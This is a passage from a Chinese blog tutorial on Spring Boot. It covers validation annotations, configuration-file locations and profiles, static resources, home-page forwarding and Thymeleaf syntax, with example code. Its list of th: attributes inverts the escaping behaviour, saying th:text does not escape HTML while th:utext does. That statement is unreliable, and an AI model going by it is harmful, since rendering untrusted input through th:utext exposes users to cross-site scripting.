class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Repeatable</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Email</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">"&#123;jakarta.validation.constraints.Email.message&#125;"</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">groups</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Payload</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">regexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">".*"</span><span class="token punctuation">;</span>    <span class="token class-name">Pattern<span class="token punctuation">.</span>Flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Documented</span>    <span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">List</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Email</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到对应的处理逻辑，<code>@Email(message=&quot;xxx&quot;)</code>修改message的值可以改变报错返回的信息</p><p>一些内嵌的约束注解：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709012524213.png" alt="image-20240709012524213"></p><hr><h2 id="多环境配置和配置文件位置"><a href="#多环境配置和配置文件位置" class="headerlink" title="多环境配置和配置文件位置"></a>多环境配置和配置文件位置</h2><p>SpringBoot中有四个地方可以存放我们的application.yaml（或.properties）配置文件（最新版貌似有五个），优先级如下：</p><ol><li><p>项目同级目录的config目录下：<code>file:./config/</code></p></li><li><p>项目同级目录：<code>file:./</code></p></li><li><p>resource的config目录下：<code>classpath:./config/</code></p></li><li><p>resource目录下（默认）：<code>classpath:./</code></p></li></ol><p>可以通过指定<code>spring.profiles.active</code>来选择环境，配置文件名为<code>application-xxx.yml(properties)</code>（xxx表示不同环境，如test——测试环境，dev——开发环境），这样子我们只需要在<code>application.yml(properties)</code>中指定<code>spring.profiles.active</code>的值就可以应用对应的配置：</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.profiles.active</span><span class="token punctuation">=</span><span class="token value attr-value">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>    <span class="token key atrule">active</span><span class="token punctuation">:</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="Web开发"><a href="#Web开发" class="headerlink" title="Web开发"></a>Web开发</h2><h3 id="静态资源导入"><a href="#静态资源导入" class="headerlink" title="静态资源导入"></a>静态资源导入</h3><ul><li>web项目中resource目录下</li><li>项目中的resource&#x2F;resource目录下</li><li>项目中的resource&#x2F;static目录下</li><li>项目中的resource&#x2F;public目录下</li></ul><p>优先级：resource&gt;static（默认）&gt;public</p><p>还有一个webjars的路径：webjars&#x2F;jquery&#x2F;3.5.1&#x2F;jquery.js</p><blockquote><p>tips：IDEA中ctrl+shift+a可以全局搜索</p></blockquote><p>源码分析：参考<a href="https://blog.csdn.net/qq_43466788/article/details/108905644">https://blog.csdn.net/qq_43466788/article/details/108905644</a></p><p>WebMvcAutoConfiguration.class，在其中找到<code>addResourceHandlers</code>方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">isAddMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Default resource handling disabled"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getWebjarsPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"classpath:/META-INF/resources/webjars/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getStaticPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>registration<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">getStaticLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ServletContextResource</span> resource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletContextResource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Resource</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>算是比较简单的一个审计代码，有时间了再审（</p><hr><h3 id="首页设置"><a href="#首页设置" class="headerlink" title="首页设置"></a>首页设置</h3><p>把index.html放在templates目录或者static文件夹下，static没有就回去templates找</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709174338230.png" alt="image-20240709174338230"></p><p>使用非index.html的文件作为首页，这里以login.html为例，有两种方法：</p><ul><li><p>自定义一个Controller进行转发：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"forward:login.html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>自定义一个 MVC 配置，并重写<code>addViewControllers</code>方法进行转发</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebMvcConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addViewControllers</span><span class="token punctuation">(</span><span class="token class-name">ViewControllerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addViewController</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span><span class="token string">"forward:login.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>更多方法移步：<a href="https://www.hangge.com/blog/cache/detail_2528.html">https://www.hangge.com/blog/cache/detail_2528.html</a></p><hr><h3 id="Thymeleaf模板引擎"><a href="#Thymeleaf模板引擎" class="headerlink" title="Thymeleaf模板引擎"></a>Thymeleaf模板引擎</h3><p>官方网站：<a href="https://www.thymeleaf.org/index.html">https://www.thymeleaf.org/index.html</a></p><p>参考：<a href="https://blog.csdn.net/u010448530/article/details/113244611">https://blog.csdn.net/u010448530/article/details/113244611</a></p><p>导入依赖：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在application.properties中配置thymleaf：</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.thymeleaf.mode</span> <span class="token punctuation">=</span> <span class="token value attr-value">LEGACYHTML5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（这个配置不是必须的，但是spring.thymeleaf.mode的默认值是HTML5，其实是一个很严格的检查，改为LEGACYHTML5可以得到一个可能更友好亲切的格式要求）</p><p>templates文件夹下创建test.html，然后创建一个IndexController控制器（在templates目录下的所有页面，只能通过controller来跳转，需要thymeleaf模板引擎的支持）</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709220439280.png" alt="image-20240709220439280"></p><hr><h4 id="Thymeleaf语法"><a href="#Thymeleaf语法" class="headerlink" title="Thymeleaf语法"></a>Thymeleaf语法</h4><p>先看一下thymeleaf的源码，在 ThymeleafProperties.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>    prefix <span class="token operator">=</span> <span class="token string">"spring.thymeleaf"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThymeleafProperties</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Charset</span> <span class="token constant">DEFAULT_ENCODING</span><span class="token punctuation">;</span>    <span class="token comment">//规则前缀</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_PREFIX</span> <span class="token operator">=</span> <span class="token string">"classpath:/templates/"</span><span class="token punctuation">;</span>    <span class="token comment">//规则后缀</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_SUFFIX</span> <span class="token operator">=</span> <span class="token string">".html"</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>thymeleaf自动配置了规则前缀和后缀，所以只要我们把html页面放在<code>calsspath:/templates/</code>下，thymeleaf就能自动渲染</p><p>依旧是可以在配置文件中来指定模板：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">thymeleaf</span><span class="token punctuation">:</span>    <span class="token key atrule">prefix</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>/templates/    <span class="token key atrule">check-template-location</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">cache</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">suffix</span><span class="token punctuation">:</span> .html    <span class="token key atrule">encoding</span><span class="token punctuation">:</span> UTF<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">content-type</span><span class="token punctuation">:</span> text/html    <span class="token key atrule">mode</span><span class="token punctuation">:</span> HTML5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>prefix：指定模板所在的目录</li><li>check-tempate-location: 检查模板路径是否存在</li><li>cache: 是否缓存，开发模式下设置为false，避免改了模板还要重启服务器，线上设置为true，可以提高性能</li><li>encoding&amp;content-type：与Servlet中设置输出对应属性效果一致</li><li>mode：见官网说明</li></ul><hr><h5 id="th属性"><a href="#th属性" class="headerlink" title="th属性"></a>th属性</h5><blockquote><p>html有的属性，Thymeleaf基本都有，而常用的属性大概有七八个。其中th属性执行的优先级从1~8，数字越低优先级越高</p></blockquote><ol><li><code>th:insert</code>：代码块引入，类似的还有<code>th:replace</code>，<code>th:include</code>，三者的区别较大，若使用不恰当会破坏html结构，常用于公共代码块提取的场景。优先级最高</li><li><code>th:each</code>：遍历循环元素，和<code>th:text</code>或<code>th:value</code>一起使用。注意该属性修饰的标签位置，详细往后看。</li><li><code>th:if</code>：条件判断，类似的还有<code>th:unless</code>，<code>th:switch</code>，<code>th:case</code>。</li><li><code>th:object</code>：声明变量，一般和<code>*&#123;&#125;</code>一起配合使用，达到偷懒的效果。</li><li><code>th:attr</code>：修改任意属性，实际开发中用的较少，因为有丰富的其他th属性帮忙，类似的还有<code>th:attrappend</code>，<code>th:attrprepend</code>。</li><li><code>th:value</code>：设置当前元素的value值，类似修改指定属性的还有<code>th:src</code>，<code>th:href</code>。</li><li><code>th:text</code> ：设置当前元素的文本内容，相同功能的还有<code>th:utext</code>，两者的区别在于<strong>前者不会转义html标签</strong>，后者会。</li><li><code>th:fragment</code>：定义代码块，方便被<code>th:insert</code>引用。优先级最低</li></ol><p>使用thymeleaf属性需要注意的点：</p><ul><li><p>若要使用Thymeleaf语法，首先要声明名称空间： <code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code></p></li><li><p>设置文本内容<code>th:text</code>，设置input的值<code>th:value</code>，循环输出<code>th:each</code>，条件判断<code>th:if</code>，插入代码块<code>th:insert</code>，定义代码块 <code>th:fragment</code>，声明变量<code>th:object</code></p></li><li><p><code>th:each</code>的用法需要格外注意，打个比方：如果你要循环一个div中的p标签，则<code>th:each</code>属性必须放在p标签上。若你将<code>th:each</code>属性放在div上，则循环的是将整个div。</p></li><li><p>变量表达式中提供了很多的内置方法，该内置方法是用<code>#</code>开头，请不要与<code>#&#123;&#125;</code>消息表达式弄混。</p></li><li><p><code>th:insert</code>，<code>th:replace</code>，<code>th:include</code> 三种插入代码块的效果相似，但区别很大。</p></li></ul><p>例子：</p><ol><li><p>先在controller中绑定数据</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">Model</span> model<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 1.绑定一个字符串</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msgUtext"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2.绑定一个pojo对象</span>        <span class="token class-name">Person</span> per <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"per"</span><span class="token punctuation">,</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 3.绑定一个list</span>        <span class="token class-name">List</span> list<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Azusa"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"hina"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"pers"</span><span class="token punctuation">,</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 4.绑定一个map</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Boss"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"boss"</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">,</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在html中使用thymeleaf语法获取数据</p><ul><li><p>声明命名空间</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:text</code>和<code>th:value</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msg&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--不会转义html标签--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>utext</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;msgUtext&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:value 设置当前元素的value值，常用，优先级仅比th:text高--></span>姓名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.name&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>年龄：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;per.age&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709223856611.png" alt="image-20240709223856611"></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709224004960.png" alt="image-20240709224004960"></p></li><li><p><code>th:each</code>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:each 遍历列表，常用，优先级很高，仅此于代码块的插入，遍历被修饰的元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token 